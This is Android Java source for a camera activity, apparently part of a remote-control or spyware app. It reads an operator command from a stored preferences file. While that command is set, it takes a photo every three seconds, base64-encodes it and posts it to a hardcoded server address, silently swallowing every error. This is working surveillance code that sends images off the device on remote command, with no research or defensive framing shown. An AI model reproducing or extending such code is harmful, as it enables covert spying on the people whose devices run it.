package com.perseus.scorpius;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.os.Bundle;
import android.os.Handler;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;
import android.view.Menu;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.FrameLayout;
import android.widget.Toast;

public class PhotographyEngine extends Activity {
	Camera mCamera;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_photography_engine);
        startCamera();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_photography_engine, menu);
        return true;
    }
    
    @Override
    public void onPause() {
    	if(mCamera!=null) {
    		mCamera.release();
    		mCamera = null;
    	}
    	super.onPause();
    }
    
    private void startCamera() {    	
        try {
        	mCamera = Camera.open();
    	    mCamera.setDisplayOrientation(90);
    	    CameraPreview mPreview = new CameraPreview(this, mCamera);
    	    FrameLayout preview = (FrameLayout) findViewById(R.id.camera_preview);	        
    	    preview.addView(mPreview);
    	} catch (Exception e){
                Toast.makeText(this, "Camera Exception" + e,Toast.LENGTH_LONG).show();    		
    	}
    }
    public class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
    	private SurfaceHolder mHolder;
        private Camera mCamera;
        public CameraPreview(Context context, Camera camera) {
        	super(context);
            mCamera = camera;
            mHolder = getHolder();
            mHolder.addCallback(this);
            mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        }
        public void surfaceCreated(SurfaceHolder holder) {
            try {
                mCamera.setPreviewDisplay(holder);
                mCamera.startPreview();
                startCapture();
            } catch (IOException e) { }
        }
        public void surfaceDestroyed(SurfaceHolder holder) {
        }
        public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        	if (mHolder.getSurface() == null) return;
            try {
                  mCamera.stopPreview();
            } catch (Exception e){ }
            try {
                  mCamera.setPreviewDisplay(mHolder);
                  mCamera.startPreview();
            } catch (Exception e){ }
        }
        private void startCapture() {
        	final Handler handler = new Handler(); 
            Timer t = new Timer(); 
            t.schedule(new TimerTask() { 
            	public void run() { 
            		handler.post(new Runnable() { 
            			public void run() { 
            				captureImage();
            			}
            		}); 
            	} 
            }, 3000);        	
        }
        private void captureImage() {
        	String PREF_FILE = "cmdFile";
        	SharedPreferences settings = getSharedPreferences(PREF_FILE, 0);
            String mode = settings.getString("mode", "0");
            String param = settings.getString("param", "0");
        	if((mode.equals("3"))&&(param.equals("PHOTO"))) {
	        	mCamera.takePicture(null, null, mPicture);
	        	startCapture();
        	} else {
        		finish();
        	}
        }
    }
    private PictureCallback mPicture = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            try {
                startImagePost(data,camera);
            } catch (Exception e) {
            }
        }
        
        private void startImagePost(byte[] data, Camera camera) {
        	HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost("http://192.168.43.192:8080/writeImage");
            try {
            	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
            	String encodedImage = Base64.encodeToString(data, Base64.DEFAULT);
              	nameValuePairs.add(new BasicNameValuePair("image", encodedImage));
            	post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            	HttpResponse response = client.execute(post);
            	BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
            	camera.startPreview();
            	while (rd.readLine() != null) {
            	}
            } catch (IOException e) {
            }
                	
        }
    };    
}